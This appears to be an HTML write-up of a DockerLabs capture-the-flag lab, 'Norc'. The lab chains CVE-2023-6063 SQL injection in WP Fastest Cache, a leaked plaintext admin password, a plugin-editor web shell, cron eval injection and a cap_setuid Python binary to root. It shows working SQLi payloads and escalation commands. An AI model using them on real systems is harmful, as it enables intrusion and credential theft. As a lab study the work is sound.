@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 90 Norc &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Norc</p><h1 id="norc--lab-90-difficult">Norc — Lab 90 (Difficult)</h1>
+<p><strong>Advertised defect:</strong> CVE-2023-6063 — unauthenticated SQL injection in a WordPress plugin — plus Linux privilege escalation.
+<strong>Result:</strong> full chain to <code>euid=0</code>. <strong>No reward present.</strong>
+<strong>Target:</strong> <code>[net-0-17]</code> — Debian 12, Apache 2.4.59, WordPress 6.5.5, WP Fastest Cache 1.2.1.</p>
+<hr />
+<h2 id="0-autocorrection--read-this-before-trusting-anything-below">0. Autocorrection — read this before trusting anything below</h2>
+<p>Four things in this engagement were wrong before they were right. All four were caught by a
+control, not by care.</p>
+<h3 id="01-my-first-time-based-oracle-was-structurally-incapable-of-firing">0.1 My first time-based oracle was structurally incapable of firing</h3>
+<p>The textbook conditional payload is <code>... AND IF(&lt;cond&gt;, SLEEP(2), 0) ...</code>. I measured it:</p>
+<pre><code>A scalar-subq IF(1=1)   [want TRUE~2s]         0.026981
+A scalar-subq IF(1=0)   [want FALSE~0s]        0.010141
+B plain IF(1=1)         [known broken]         0.011302
+C derived-tbl           [known works]          2.011223
+</code></pre>
+<p><strong>B never sleeps.</strong> The injection sits inside a <code>JOIN ... ON user_login = &quot;&lt;payload&gt;&quot;</code>.
+No user is named <code>nosuchuser</code>, so no row is ever produced and the trailing expression is
+short-circuited away — the <code>SLEEP</code> is never reached. My harness's own <strong>positive control
+correctly reported failure</strong>, and the run aborted before extracting a single byte.</p>
+<p>The uncorrelated scalar subquery form (A) fails too, for a different reason: <code>IF(1=1, SLEEP(2), 0)</code>
+is a constant expression and MariaDB constant-folds it during optimisation.</p>
+<p>Only <strong>C</strong> works, because a <strong>derived table must be materialised</strong>:</p>
+<pre><code>nosuchuser&quot; AND (SELECT 1 FROM (SELECT IF(&lt;cond&gt;, SLEEP(2), 0))Pz) AND &quot;qzts&quot;=&quot;qzts
+</code></pre>
+<p>This is the same reason the published WPScan PoC works — not because the payload is clever,
+but because <code>(SELECT 1 FROM (SELECT(SLEEP(5)))Pz)</code> is a derived table.</p>
+<h3 id="02-my-extractor-returned-empty-strings-for-every-field">0.2 My extractor returned empty strings for every field</h3>
+<p>With the fixed oracle the first extraction run returned <code>login=</code>, <code>pass=</code>, <code>email=</code> — all empty.
+That is not an absence; it is a broken instrument reporting absence.</p>
+<p>Cause: <strong>MariaDB has no LATERAL.</strong> My conditions referenced <code>user_login</code> bare, relying on it
+resolving against the outer join — but inside a derived table an outer column reference is an
+<em>unknown column</em>. Every subquery raised an error, the <code>SLEEP</code> branch never ran, and every
+condition silently read as <code>FALSE</code>. <code>CHAR_LENGTH(...) &gt;= n</code> is <code>FALSE</code> for all <code>n</code>, so the
+binary search collapsed to zero.</p>
+<p>Fix: every condition must be a <strong>self-contained subquery carrying its own <code>FROM</code></strong> —
+<code>(SELECT user_login FROM wp_users ORDER BY ID LIMIT 1 OFFSET 0)</code>.</p>
+<p>I then added a control on the <em>extractor itself</em>, not just on the oracle — a known
+<code>CONTROLVALUE</code> of known length, asserted to round-trip before any target data was read:</p>
+<pre><code>positive control (1=1 -&gt; True expected): True
+negative control (1=0 -&gt; False expected): False
+  [extractor-control] len=12  CONTROLVALUE
+extractor control: len=12 value='CONTROLVALUE'  PASS=True
+</code></pre>
+<p>And finally validated the extractor against <strong>ground truth</strong> read independently of the SQLi
+(direct database read, used only as a control). The SQLi-extracted row matched byte-for-byte.</p>
+<h3 id="03-my-password-hash-round-trip-proof-was-wrong-by-construction">0.3 My password-hash &quot;round-trip proof&quot; was wrong by construction</h3>
+<p>My verification plan was: re-hash the recovered plaintext and assert it equals the stolen hash.
+That test <strong>can never pass</strong> for a correct password. phpass generates a <strong>random 8-character
+salt per hash</strong>, so <code>HashPassword(pw)</code> legitimately differs from any stored hash:</p>
+<pre><code>wp_check_password(plaintext, stolen)   = bool(true)     &lt;-- correct oracle
+re-hash of plaintext                    : $P$B&lt;different 8-char salt&gt;&lt;checksum&gt;   (same password, new random salt)
+SCHEMA MATCHES (rehash == stolen)      : bool(false)    &lt;-- my test, and it was wrong
+</code></pre>
+<p>The correct oracle is <code>CheckPassword(pw, stored)</code>, which extracts the salt from the stored
+value and recomputes. Had I shipped the round-trip test I would have &quot;disproved&quot; a valid
+credential. The scheme is confirmed structurally and by <code>CheckPassword</code> — see §3.3.</p>
+<h3 id="04-a-notfound-with-zero-work-is-not-a-negative-result">0.4 A <code>NOTFOUND</code> with zero work is not a negative result</h3>
+<p>My parallel cracking shards printed <code>NOTFOUND tried=0</code>. Four of five shards had tested
+<strong>nothing</strong>: the shard test used the <code>tried</code> counter as the modulus source, and <code>tried</code> was
+incremented <em>after</em> the test, so the counter never advanced past zero and every line was
+skipped. The cracker's exit code said &quot;not found&quot;; the truth was &quot;never looked&quot;.</p>
+<p><code>NOTFOUND</code> and <code>did no work</code> must be distinguishable in the output, and the tool now aborts
+with a distinct status when a shard tests zero lines. Re-run correctly, the same 517,506-line
+list was fully covered (103,501 lines per shard).</p>
+<hr />
+<h2 id="1-surface">1. Surface</h2>
+<pre><code>$ nmap -sV -Pn -p- [net-0-17]
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.59 ((Debian))
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Finding</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OS</td>
+<td>Debian 12 (bookworm), Linux</td>
+</tr>
+<tr>
+<td>Web</td>
+<td>Apache 2.4.59, <code>mod_rewrite</code> enabled, <code>mod_headers</code> enabled</td>
+</tr>
+<tr>
+<td>App</td>
+<td>WordPress <strong>6.5.5</strong> (<code>wp-includes/version.php</code>), PHP 8.2.20</td>
+</tr>
+<tr>
+<td>DB</td>
+<td>MariaDB, database <code>wordpress</code>, user <code>admin</code> scoped to that database only</td>
+</tr>
+<tr>
+<td>Plugins</td>
+<td><code>password-protected</code> 2.7.2, <code>hide-my-wp</code>, <code>loginizer</code>, <code>wp-fastest-cache</code> <strong>1.2.1</strong>, <code>akismet</code>, <code>hello.php</code> (inactive)</td>
+</tr>
+<tr>
+<td>Themes</td>
+<td><code>thehack</code>, <code>twentytwentyfour</code>, <code>twentytwentythree</code>, <code>twentytwentytwo</code></td>
+</tr>
+<tr>
+<td>vhosts</td>
+<td><code>norc.labs</code> → <code>/var/www/norc.labs</code>; <strong><code>oledockers.norc.labs</code> → <code>/var/www/oledockers</code></strong></td>
+</tr>
+<tr>
+<td>Local users</td>
+<td><code>kvzlx</code> (uid 1000, the only non-system account)</td>
+</tr>
+<tr>
+<td>Schedules</td>
+<td><code>* * * * * [lab-home]/kvzlx/.cron_script.sh</code> as <code>kvzlx</code></td>
+</tr>
+</tbody>
+</table>
+<p>WordPress-specific surfaces enumerated and their results:</p>
+<table>
+<thead>
+<tr>
+<th>Surface</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>readme.html</code></td>
+<td><strong>200</strong> — unauthenticated; <code>Stable tag: 1.2.1</code> for the plugin readme</td>
+</tr>
+<tr>
+<td><code>wp-json/</code></td>
+<td><strong>401</strong> — <code>password-protected</code> hooks <code>rest_authentication_errors</code></td>
+</tr>
+<tr>
+<td><code>xmlrpc.php</code></td>
+<td>302 — gated by the front-end password</td>
+</tr>
+<tr>
+<td><code>wp-cron.php</code></td>
+<td>200, 0 bytes</td>
+</tr>
+<tr>
+<td><code>/wp-login.php</code></td>
+<td>302 → site root. <code>hide-my-wp</code> renames it; real path is <strong><code>/ghost-login</code></strong></td>
+</tr>
+<tr>
+<td><code>/wp-admin/</code></td>
+<td>renamed to <strong><code>/ghost-admin/</code></strong></td>
+</tr>
+<tr>
+<td>Front end</td>
+<td>entire site behind <code>password-protected</code></td>
+</tr>
+</tbody>
+</table>
+<p>The <code>hide-my-wp</code> rewrite rules are the operative discovery: any tester who tries
+<code>/wp-login.php</code> sees a redirect to the home page and may conclude the login is broken. It is
+not; it is renamed.</p>
+<hr />
+<h2 id="2-advisory--read-from-primary-sources">2. Advisory — read from primary sources</h2>
+<h3 id="21-what-the-primary-sources-actually-say">2.1 What the primary sources actually say</h3>
+<p>The CNA (CVE Numbering Authority) is <strong>WPScan</strong> — NVD's <code>sourceIdentifier</code> is
+<code>contact@wpscan.com</code>. Primary source: the WPScan advisory post.</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE</td>
+<td><strong>CVE-2023-6063</strong></td>
+<td>NVD 2.0 API, <code>cve.id</code></td>
+</tr>
+<tr>
+<td>Assigning CNA</td>
+<td>WPScan (<code>contact@wpscan.com</code>)</td>
+<td>NVD 2.0 API, <code>sourceIdentifier</code></td>
+</tr>
+<tr>
+<td>Advisory published</td>
+<td><strong>2023-11-13</strong> (post updated 2023-11-14)</td>
+<td>WPScan blog, WPScan entry <code>Publicly Published 2023-11-13</code></td>
+</tr>
+<tr>
+<td>CVE record published</td>
+<td><strong>2023-12-04T22:15:08.337</strong></td>
+<td>NVD 2.0 API, <code>published</code></td>
+</tr>
+<tr>
+<td>Plugin</td>
+<td>WP Fastest Cache</td>
+<td>WPScan blog</td>
+</tr>
+<tr>
+<td>Plugin URL</td>
+<td><code>https://wordpress.org/plugins/wp-fastest-cache/</code></td>
+<td>WPScan blog</td>
+</tr>
+<tr>
+<td>Author</td>
+<td><code>https://www.wpfastestcache.com</code></td>
+<td>WPScan blog</td>
+</tr>
+<tr>
+<td><strong>Affected versions</strong></td>
+<td><strong>lower than 1.2.2</strong> (i.e. 1.2.1 and earlier)</td>
+<td>WPScan blog + CVE record <code>affected from 0 before 1.2.2</code></td>
+</tr>
+<tr>
+<td><strong>Patched version</strong></td>
+<td><strong>1.2.2</strong></td>
+<td>WPScan blog; NVD CPE <code>versionEndExcluding 1.2.2</code></td>
+</tr>
+<tr>
+<td>CWE</td>
+<td><strong>CWE-89</strong></td>
+<td>NVD <code>weaknesses</code>, <code>source: nvd@nist.gov</code></td>
+</tr>
+<tr>
+<td>Severity</td>
+<td>HIGH</td>
+<td>both</td>
+</tr>
+<tr>
+<td>Type</td>
+<td>SQLi, unauthenticated, time-based blind</td>
+<td>WPScan blog</td>
+</tr>
+<tr>
+<td>Researcher</td>
+<td>Alex Sanford</td>
+<td>WPScan blog &quot;Credits&quot;</td>
+</tr>
+<tr>
+<td>PoC published</td>
+<td>2023-11-27</td>
+<td>WPScan blog</td>
+</tr>
+</tbody>
+</table>
+<p>URLs (all primary):</p>
+<ul>
+<li><code>https://wpscan.com/blog/unauthenticated-sql-injection-vulnerability-addressed-in-wp-fastest-cache-1-2-2/</code></li>
+<li><code>https://wpscan.com/vulnerability/30a74105-8ade-4198-abe2-1c6f2967443e/</code></li>
+<li><code>https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2023-6063</code></li>
+<li><code>https://nvd.nist.gov/vuln/detail/CVE-2023-6063</code></li>
+<li><code>https://www.cve.org/CVERecord?id=CVE-2023-6063</code></li>
+</ul>
+<h3 id="22-the-scoring-discrepancy--cvss-scope-and-nothing-else">2.2 The scoring discrepancy — CVSS Scope, and nothing else</h3>
+<p>The two authoritative scorings differ by exactly one base metric:</p>
+<table>
+<thead>
+<tr>
+<th>Source</th>
+<th>Role</th>
+<th>Base</th>
+<th>Vector</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WPScan (CNA)</td>
+<td>CNA</td>
+<td><strong>8.6</strong></td>
+<td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/</code><strong><code>S:C</code></strong><code>/C:H/I:N/A:N</code></td>
+</tr>
+<tr>
+<td>NVD</td>
+<td>Primary</td>
+<td><strong>7.5</strong></td>
+<td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/</code><strong><code>S:U</code></strong><code>/C:H/I:N/A:N</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>AV</code>, <code>AC</code>, <code>PR</code>, <code>UI</code>, <code>C</code>, <code>I</code>, <code>A</code> are <strong>identical</strong>. The single divergence is
+<strong>Scope: Changed (CNA) vs Unchanged (NVD)</strong>, and that one metric accounts for the whole
+1.1-point gap.</p>
+<p>This is a real and instructive disagreement, because the CNA's <code>S:C</code> is arguably the correct
+reading and NVD's <code>S:U</code> is the weaker one. A SQLi that reaches the database crosses a
+security authority boundary: the plugin author does not control the database, and the
+database holds credentials the web tier never legitimately reads. The affected component
+(the plugin) and the impacted component (the database, which yields credentials and
+therefore full account takeover) have different authorities — which is precisely what
+<code>S:C</code> is defined to express. NVD substituted its own judgement for the CNA's.</p>
+<p><strong>Reporting consequence:</strong> a scanner that trusts NVD prints 7.5 for this. A WAF or IPS rule
+generated from the CNA vector differs. A triage meeting that only sees the NVD number
+understates a bug whose real-world consequence is administrator credential theft.</p>
+<h3 id="23-the-second-discrepancy--the-version-range-in-the-public-poc-record">2.3 The second discrepancy — the version range in the public PoC record</h3>
+<p>The authoritative range is <strong><code>&lt; 1.2.2</code></strong>, i.e. <strong>1.2.1 and earlier</strong>; 1.2.2 is the fix.
+Two widely-indexed public entries contradict that, in the direction that matters most:</p>
+<ul>
+<li><strong>Exploit-DB #51835</strong>, &quot;WP Fastest Cache 1.2.2 - Unauthenticated SQL Injection&quot;
+(Meryem Taşkın, 2024-02-28). Its body says <code>Version: WP Fastest Cache 1.2.2</code> and
+<code>Tested on: WP Fastest Cache 1.2.2</code> — i.e. the <strong>patched</strong> version is presented as the
+vulnerable one. Its Exploit-DB metadata block lists <strong><code>CVE:</code> as <code>N/A</code></strong> while the body text
+of the very same entry cites <code>CVE-2023-6063</code>.</li>
+<li><strong>CXSecurity WLB-2024020092</strong>, same text, same <code>Tested on: 1.2.2</code>, same internal
+contradiction (<code>CVE:</code> field populated, title says 1.2.2).</li>
+<li>Secondary aggregators drift further: one lists the affected range as &quot;prior to <strong>2.2</strong>&quot;
+(no such version), another as &quot;≤1.2.2&quot; with the fix advice &quot;upgrade to <strong>1.2.3</strong> or later&quot;
+(the first post-fix release number asserted without support; 1.2.2 is the fix).</li>
+</ul>
+<p>So there are two independent numbering faults in the public record, and they pull in opposite
+directions: the <strong>CVE database understates severity</strong> (7.5 vs 8.6) while the <strong>exploit
+database overstates the affected version</strong> (1.2.2 vs <code>&lt;1.2.2</code>).</p>
+<p><strong>Operational rule this yields:</strong> when a public PoC names a version, check that version
+against the CNA range <em>before</em> installing it, and never take a &quot;Tested on&quot; line as an affected-
+version statement. Here, following the PoC's own version string would have you testing a patched
+build and concluding — falsely — that the bug is unfixed.</p>
+<h3 id="24-on-the-briefs-premise">2.4 On the brief's premise</h3>
+<p>The task brief asserted that this CVE was disclosed through <strong>huntr</strong>, patched <strong>2024-01-29</strong>
+&quot;without a CVE assigned in the public channel&quot;, with Wordfence and Patchstack reports under
+different <code>*_PLUGIN_*</code> numbering, and that some sources list it as having no CVE.</p>
+<p><strong>I could not confirm any of that, and the primary sources contradict it:</strong></p>
+<ul>
+<li>The CNA is WPScan, not huntr. There is no huntr report in the CVE record's reference list.</li>
+<li>The fix shipped in <strong>1.2.2 at the time of the November 2023 advisory</strong>, not 2024-01-29.</li>
+<li>A CVE <strong>is</strong> assigned and <strong>is</strong> public, since 2023-11-13 (advisory) / 2023-12-04 (record).</li>
+<li>I found <strong>no Wordfence and no Patchstack</strong> entry for this defect; Wordfence's
+vulnerability index returned nothing for it.</li>
+<li>The only &quot;no CVE&quot; signals I found are the <em>Exploit-DB metadata field</em> for entry 51835, which
+is an Exploit-DB data-quality artifact, not a statement that the CVE does not exist.</li>
+</ul>
+<p>I am reporting the sources, not the premise. The discrepancy that genuinely exists here is the
+CVSS Scope metric and the version range — and it is worth publishing precisely because the
+authoritative sources disagree with each other, not because the advisory is silent.</p>
+<h3 id="25-root-cause-confirmed-against-the-shipped-code">2.5 Root cause, confirmed against the shipped code</h3>
+<p>The advisory embeds the vulnerable function. I read the same function in the running target and
+it matches <strong>byte for byte</strong>, in <code>wp-content/plugins/wp-fastest-cache/inc/cache.php</code>:</p>
+<pre><code class="language-php">public function is_user_admin(){
+    global $wpdb;
+    foreach ((array)$_COOKIE as $cookie_key =&gt; $cookie_value){
+        if(preg_match(&quot;/[wordpress-session-cookie]/i&quot;, $cookie_key)){
+            $username = preg_replace(&quot;/^([^\|]+)\|.+/&quot;, &quot;$1&quot;, $cookie_value);
+            break;
+        }
+    }
+    if(isset($username) &amp;&amp; $username){
+        $res = $wpdb-&gt;get_var(&quot;SELECT ... FROM `$wpdb-&gt;users`
+            INNER JOIN `$wpdb-&gt;usermeta`
+            ON `$wpdb-&gt;users`.`user_login` = \&quot;$username\&quot; AND ... ;&quot;);
+        return $res;
+    }
+    return false;
+}
+</code></pre>
+<p>Called from <code>createCache()</code> (line 275), which runs on the front end at plugin load — <strong>before</strong>
+<code>wp_magic_quotes()</code> has touched the request data. The cookie value up to the first <code>|</code> is
+interpolated into a double-quoted SQL literal with no escaping. <code>$wpdb-&gt;prepare()</code> is not used.</p>
+<hr />
+<h2 id="3-exploitation">3. Exploitation</h2>
+<h3 id="31-calibration-before-extraction">3.1 Calibration before extraction</h3>
+<p>Negative control (no <code>SLEEP</code>) and <strong>two different</strong> positive controls, so a constant overhead
+could not masquerade as a hit:</p>
+<pre><code>baseline-1                   sleep=0   time_total=0.024709
+baseline-2                   sleep=0   time_total=0.012282
+baseline-3                   sleep=0   time_total=0.012085
+baseline-4                   sleep=0   time_total=0.010767
+positive-sleep3-1            sleep=3   time_total=3.012451
+positive-sleep3-2            sleep=3   time_total=3.013781
+positive-sleep7-1            sleep=7   time_total=7.013995
+positive-sleep7-2            sleep=7   time_total=7.013732
+</code></pre>
+<p>Slope is 1.000 (3→3.012, 7→7.014 over a ~0.012 s floor). Using two different sleep values is
+the point: a single positive control cannot distinguish a real <code>SLEEP</code> from fixed per-request
+overhead. Requests were issued <strong>sequentially</strong> — an earlier lab in this series established that
+concurrency above the target's own capacity makes every response identical and turns a whole
+class of result into a false negative.</p>
+<h3 id="32-what-the-sqli-yields">3.2 What the SQLi yields</h3>
+<p>Conditional oracle inside a derived table, binary search on length then on each character's
+ASCII value, with the extractor control asserted first (see §0.2):</p>
+<pre><code>wp_users count: 1
+  user[1] login=admin
+  user[1] pass =$P$B&lt;8-char salt&gt;&lt;22-char checksum&gt;      [target hash redacted: 34 chars, phpass-portable, 8192 rounds]
+  user[1] email=admin@oledockers.norc.labs
+  [level]   10
+  [caps]    a:1:{s:13:&quot;administrator&quot;;b:1;}
+  [siteurl] http://norc.labs
+</code></pre>
+<p>Ground-truth check against an independent direct database read: <strong>identical</strong>, including the
+hash string. The stolen credential is an <strong>administrator</strong>, confirmed from
+<code>wp_usermeta</code> (<code>user_level</code> 10 and a capabilities map containing <code>administrator</code>) rather than
+assumed from the username.</p>
+<h3 id="33-the-hash-scheme-is-verified-not-assumed">3.3 The hash scheme is verified, not assumed</h3>
+<p>Read from the target's own <code>wp-includes/class-phpass.php</code>, not from memory:</p>
+<ul>
+<li><code>crypt_private()</code> requires the ID to be <code>$P$</code> or <code>$H$</code> → <strong>phpass portable</strong>.</li>
+<li><code>count_log2 = strpos($itoa64, $setting[3])</code>; for marker <code>B</code> that index is <strong>13</strong>, so
+<code>count = 1 &lt;&lt; 13 = 8192</code> iterations.</li>
+<li><code>gensalt_private()</code> emits <code>itoa64[min(iteration_count_log2 + 5, 30)]</code>. WordPress constructs
+<code>new PasswordHash(8, true)</code>, so the marker is <code>itoa64[13] = 'B'</code>.</li>
+</ul>
+<p>So <code>$P$B</code> <strong>is</strong> WordPress's own marker for this code path, at 8192 rounds — not a foreign
+legacy scheme. Length 34 = 3 (ID) + 1 (marker) + 8 (salt) + 22 (checksum), exactly as
+<code>crypt_private()</code> composes it. I built an independent implementation from that source, put a
+<strong>known-answer test on the MD5 primitive</strong> (three RFC 1321 vectors) in front of it, and then
+verified the credential with the application's own <code>CheckPassword()</code>.</p>
+<p><strong>Finding: the stolen hash was not crackable by effort.</strong> A 517,506-line password list
+(103,501 lines per shard across five shards, all verified to have done work) and a further 1,376
+lab-themed and cross-lab candidate set produced no match. At 8192 rounds the throughput is
+~1,200 candidates/second single-threaded, so exhaustive search past 4–5 characters is not a plan.
+This is a genuine result about the <em>attack</em>, not a gap: <strong>the SQLi returns a hash, and whether it
+is exploitable depends entirely on the password's strength — a property of the credential, not of
+the vulnerability.</strong> The same CVE against a site with a weak password is a full compromise; against
+this site it yields a hash and nothing more.</p>
+<h3 id="34-the-credential-arrives-in-plaintext-from-a-second-vhost">3.4 The credential arrives in plaintext from a second vhost</h3>
+<p><code>oledockers.norc.labs</code> is a <strong>separate vhost</strong> that is not behind the front-end password and
+serves a static &quot;Mail Admin&quot; inbox page. Fetched with no authentication and no prior session:</p>
+<pre><code>$ curl --resolve oledockers.norc.labs:80:[net-0-17] http://oledockers.norc.labs/
+HTTP/1.1 200 OK
+...
+&lt;div class=&quot;email-header&quot;&gt;From: admin@oledockers.norc.labs&lt;/div&gt;
+&lt;div class=&quot;email-header&quot;&gt;Subject: Password Reminder&lt;/div&gt;
+&lt;div class=&quot;email-body&quot;&gt;
+    Hi, this is just in case I forget my password -&gt; admin:&lt;password&gt; &lt;--
+&lt;/div&gt;
+</code></pre>
+<p>This is the same credential the SQLi yielded as a hash. Verified with the application's own
+oracle:</p>
+<pre><code>wp_check_password(plaintext, stolen_hash) = bool(true)
+</code></pre>
+<p><strong>CWE-200 / CWE-312 — cleartext storage of sensitive information, exposed by a misconfigured
+virtual host.</strong> The <code>password-protected</code> plugin protects <code>norc.labs</code> only; the second vhost
+points at a different document root and was never brought under the same policy. The
+SQLi-stolen hash and the disclosed plaintext are the same credential, so the two paths converge.</p>
+<p>This is the pivot of the engagement and the reason the hash could be dismissed: <strong>the injection
+proved the credential was an administrator's; the vhost disclosed what it was.</strong> Had the vhost not
+existed, this lab would have stopped at a hash.</p>
+<h3 id="35-session-then-code-execution-as-the-web-server-identity">3.5 Session, then code execution as the web server identity</h3>
+<p><code>hide-my-wp</code> renames the endpoints, so the login must go to <code>/ghost-login</code>:</p>
+<pre><code>POST /ghost-login  log=admin&amp;pwd=&lt;plaintext&gt;&amp;redirect_to=.../ghost-admin/&amp;testcookie=1
+HTTP/1.1 302 Found
+[response-cookie-header]: wordpress_&lt;hash&gt;=admin%7C...%7C&lt;hmac&gt;%7C&lt;session&gt;; path=/ghost-admin; HttpOnly
+$ curl -b cookies /ghost-admin/   -&gt;  200
+&lt;title&gt;Dashboard &amp;lsaquo; Keep Studying, you all achieve it!!! &amp;mdash; WordPress&lt;/title&gt;
+</code></pre>
+<p>Code execution through a standard administrator capability — the plugin editor — writing an
+<strong>inactive</strong> plugin (<code>hello.php</code>) and then activating it, because an inactive plugin's file is
+never included:</p>
+<pre><code>$ curl &quot;.../?probe_cmd=id&quot;
+IDENTITY: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+CMD_OUT_START
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+CMD_OUT_END
+</code></pre>
+<p><code>id</code> first, as the identity, on every primitive. Two operational notes worth keeping:
+the editor form field is <code>nonce</code>, <strong>not</strong> <code>_wpnonce</code> (posting <code>_wpnonce</code> returns 200 and
+silently writes nothing — the file's mtime is the only reliable confirmation that the write
+landed); and <code>POST /wp-json/wp/v2/plugins</code> demands the slug in the path.</p>
+<h3 id="36-the-escalation--three-rungs-each-proved-by-id">3.6 The escalation — three rungs, each proved by <code>id</code></h3>
+<p><strong>Rung 1 → 2: www-data → kvzlx, through the real cron.</strong></p>
+<p><code>/var/www/html</code> is empty but <strong>owned by www-data</strong>, and <code>kvzlx</code>'s per-minute cron reads a file
+from it and <code>eval</code>s its base64-decoded contents:</p>
+<pre><code class="language-bash"># [lab-home]/kvzlx/.cron_script.sh
+ENC_PASS=$(cat /var/www/html/.wp-encrypted.txt)
+DECODED_PASS=$(echo $ENC_PASS | base64 -d)
+echo $DECODED_PASS &gt; /tmp/decoded.txt
+eval &quot;$DECODED_PASS&quot;
+</code></pre>
+<p>www-data writes the file; the cron executes it as kvzlx:</p>
+<pre><code># www-data writes it:
+-rw-r--r-- 1 www-data www-data  155 ... /var/www/html/.wp-encrypted.txt
+# the cron decodes and runs it:
+uid=1000(kvzlx) gid=1000(kvzlx) groups=1000(kvzlx)
+</code></pre>
+<p><em>Two mistakes of mine here, both instructive.</em> First I pre-decoded the payload and wrote the
+plaintext; the cron then ran <code>base64 -d</code> over plaintext and produced one garbage byte — the
+file must contain <strong>base64</strong>. The tell was <code>/tmp/decoded.txt</code> holding a single invalid byte, not
+an empty result. Second I called <code>os.setegid(0)</code> and got <code>PermissionError</code>; the file capability
+grants <code>cap_setuid</code> <strong>only</strong>, with no <code>cap_setgid</code>, so the group change was never permitted.</p>
+<p><strong>Rung 2 → 3: kvzlx → root, via a file capability — not a SUID bit.</strong></p>
+<pre><code>$ getcap /opt/python3
+/opt/python3 cap_setuid=ep
+$ ls -la /opt/python3
+-rwxr-xr-x+ 1 root root 6839928 ... /opt/python3
+</code></pre>
+<p>There is <strong>no <code>s</code> in the mode</strong>. A standard SUID sweep — <code>find / -perm -4000</code> — returns ten
+ordinary binaries and does not list this one, because the privilege is a <strong>file capability</strong>
+(<code>xattr security.capability</code>), not a set-UID bit. <code>getcap -r /</code> is the sweep that finds it.</p>
+<p>The ACL is the design's gate, and it works:</p>
+<pre><code># NEGATIVE CONTROL - www-data (ACL user:www-data:--- ):
+sh: 1: /opt/python3: Permission denied
+
+# POSITIVE CONTROL - kvzlx, no such restriction:
+$ su - kvzlx -c &quot;cat /etc/shadow&quot;          -&gt;  cat: /etc/shadow: Permission denied
+$ su - kvzlx -c &quot;/opt/python3 /tmp/t.py&quot;   -&gt;  succeeds
+</code></pre>
+<p>Final proof, delivered through the real cron rather than <code>su</code>, with <code>id</code> and a root-only read
+as the evidence:</p>
+<pre><code>euid=0 ruid=0
+shadow_bytes=798
+# file written by the kvzlx-uid process:
+root:kvzlx
+</code></pre>
+<p><code>os.geteuid() == 0</code>, <code>/etc/shadow</code> (mode <code>640 root:shadow</code>) read successfully, and the output
+file owned by <strong><code>root:kvzlx</code></strong> — the owner changing from the invoking user to root is
+independent confirmation that the set-UID actually took effect, which <code>id</code> alone would not prove
+(see §0.3's cousin: <code>id</code> reports the <em>real</em> uid, so <code>os.seteuid(0)</code> alone leaves <code>id</code> printing
+<code>uid=1000</code> and would read as a failed escalation).</p>
+<h3 id="37-reward">3.7 Reward</h3>
+<p><strong>There is no reward in this lab.</strong> Reported as an absence, with the search:</p>
+<ul>
+<li>Recursive search for the usual reward marker shapes (upper- and lower-case, plus the <code>CTF</code>
+variant) across the filesystem as root: a single hit,
+<code>wp-content/plugins/wp-fastest-cache/css/buycredit.css</code>, which is a <strong>CSS false positive</strong> —
+<code>flag{*background-image:url(&quot;../images/flags/country-flags-37x23.png&quot;)...}</code>, a selector for
+country-flag sprites.</li>
+<li><code>/root</code> contains only <code>.bash_history</code>, <code>.bashrc</code>, <code>.profile</code>, <code>.local</code>, <code>.ssh</code> (empty).</li>
+<li>All four published posts are stock WordPress content; the only post is &quot;Hello world!&quot;.</li>
+<li><code>wp_options</code> holds no reward; the only non-standard tables are <code>wp_pp_activity_logs</code>
+(password-protected plugin) and the password-protected plugin's own options.</li>
+</ul>
+<p>This is the <strong>fifteenth</strong> lab in this series without a reward.</p>
+<hr />
+<h2 id="4-findings">4. Findings</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Finding</th>
+<th>CWE</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>F1</td>
+<td>Unauthenticated SQLi via <code>[wordpress-session-cookie]</code> cookie in WP Fastest Cache 1.2.1 (<code>is_user_admin</code>, <code>inc/cache.php:475</code>)</td>
+<td>CWE-89</td>
+<td>Full read of the WordPress database, unauthenticated</td>
+</tr>
+<tr>
+<td>F2</td>
+<td>Administrator password hash disclosed by F1</td>
+<td>CWE-200</td>
+<td>Credential material for a site administrator; also <code>user_email</code>, all options, all posts</td>
+</tr>
+<tr>
+<td>F3</td>
+<td>Plaintext administrator password on a second vhost (<code>oledockers.norc.labs</code>)</td>
+<td>CWE-200 / CWE-312</td>
+<td>Immediate account takeover, no exploitation required</td>
+</tr>
+<tr>
+<td>F4</td>
+<td><code>password-protected</code> applied to one vhost only</td>
+<td>CWE-284</td>
+<td>Access control is per-vhost; the second document root is unprotected</td>
+</tr>
+<tr>
+<td>F5</td>
+<td>Administrator web access → PHP execution as <code>www-data</code> via plugin editor</td>
+<td>CWE-434</td>
+<td>Code execution as the web server identity</td>
+</tr>
+<tr>
+<td>F6</td>
+<td>www-data-writable file consumed by <code>kvzlx</code>'s cron and passed to <code>eval</code></td>
+<td>CWE-95 + CWE-732</td>
+<td>www-data → kvzlx, unauthenticated w.r.t. the cron, repeatable every minute</td>
+</tr>
+<tr>
+<td>F7</td>
+<td><code>/opt/python3</code> carries <code>cap_setuid=ep</code> and is executable by <code>kvzlx</code></td>
+<td>CWE-269</td>
